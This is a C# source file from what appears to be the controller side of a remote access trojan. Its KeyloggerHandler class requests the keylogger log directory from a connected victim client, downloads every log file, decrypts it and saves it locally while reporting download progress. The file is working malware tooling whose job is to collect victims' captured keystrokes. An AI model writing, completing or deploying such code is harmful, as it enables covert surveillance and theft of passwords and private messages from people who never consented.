using Common.Helper;
using Common.Models;
using Server.Networking.Packets.FileManager;
using Server.Networking.Packets.Keylogger;
using System.IO.Enumeration;

namespace Server.Networking.Handlers
{
    public class KeyloggerHandler : IDisposable
    {
        #region Event
        protected readonly SynchronizationContext SynchronizationContext;
        public delegate void LogsChangedEventHandler(object sender, string message);
        public event LogsChangedEventHandler LogsChanged;
        private void OnLogsChanged(string message)
        {
            SynchronizationContext.Post(d =>
            {
                LogsChanged?.Invoke(this, (string)d);
            }, message);
        }
        #endregion

        private readonly Client _client;

        private FileManagerHandler _fileManagerHandler;
        private string _remoteKeyloggerDirectory;
        private int _allTransfers;
        private int _completedTransfers;

        public KeyloggerHandler(Client client)
        {
            SynchronizationContext = new SynchronizationContext();
            _client = client;
        }

        public void Init()
        {
            _fileManagerHandler = _client.ClientHandler.FileManagerHandler;
            _fileManagerHandler.DirectoryChanged += DirectoryChanged;
            _fileManagerHandler.FileTransferUpdated += FileTransferUpdated;
            _fileManagerHandler.StatusMessageChanged += StatusUpdated;
        }

        private void StatusUpdated(object sender, string value)
        {
            OnLogsChanged($"No logs found ({value})");
        }

        private void DirectoryChanged(object sender, string remotePath, List<FileSystemEntry> items)
        {
            if (items.Count() == 0)
            {
                LogsChanged?.Invoke(this, "No logs found");
                return;
            }

            _allTransfers = items.Count();
            _completedTransfers = 0;
            OnLogsChanged(GetDownloadProgress(_allTransfers, _completedTransfers));

            foreach (var item in items)
            {
                // don't escape from download directory
                if (FileHelper.HasIllegalCharacters(item.Name))
                {
                    // disconnect malicious client
                    _client.Disconnect();
                    return;
                }

                _fileManagerHandler.BeginDownloadFile(Path.Combine(_remoteKeyloggerDirectory, item.Name), item.Name + ".html", true);
            }
        }

        private void FileTransferUpdated(object sender, FileTransfer transfer)
        {
            if (transfer.Status == "Completed")
            {
                try
                {
                    _completedTransfers++;
                    File.WriteAllText(Path.Combine(_client.Value.DownloadDirectory, "Logs\\", Path.GetFileName(transfer.LocalPath)), FileHelper.ReadLogFile(transfer.LocalPath));
                    //File.Move(transfer.LocalPath, Path.Combine(_client.Value.DownloadDirectory, "Logs\\", Path.GetFileName(transfer.LocalPath)), true);
                    OnLogsChanged(_allTransfers == _completedTransfers
                        ? "Successfully retrieved all logs"
                        : GetDownloadProgress(_allTransfers, _completedTransfers));
                }
                catch (Exception)
                {
                    OnLogsChanged("Failed to decrypt and write logs");
                }
            }
        }

        private string GetDownloadProgress(int allTransfers, int completedTransfers)
        {
            try
            {
                decimal progress = Math.Round((decimal)((double)completedTransfers / (double)allTransfers * 100.0), 2);
                return $"Downloading...({progress}%)";
            }
            catch (Exception)
            {
                return $"Downloading...";
            }
        }

        public void RetrieveLogs()
        {
            _ = _client.QueuePacketAsync(new GetKeyloggerLogsDirectory());
        }

        public void Handler(GetKeyloggerLogsDirectory packet)
        {
            _remoteKeyloggerDirectory = packet.LogsDirectory;
            _ = _client.QueuePacketAsync(new GetDirectoryPacket { RemotePath = _remoteKeyloggerDirectory });
        }

        public void Dispose()
        {
            GC.SuppressFinalize(this);
        }
    }
}
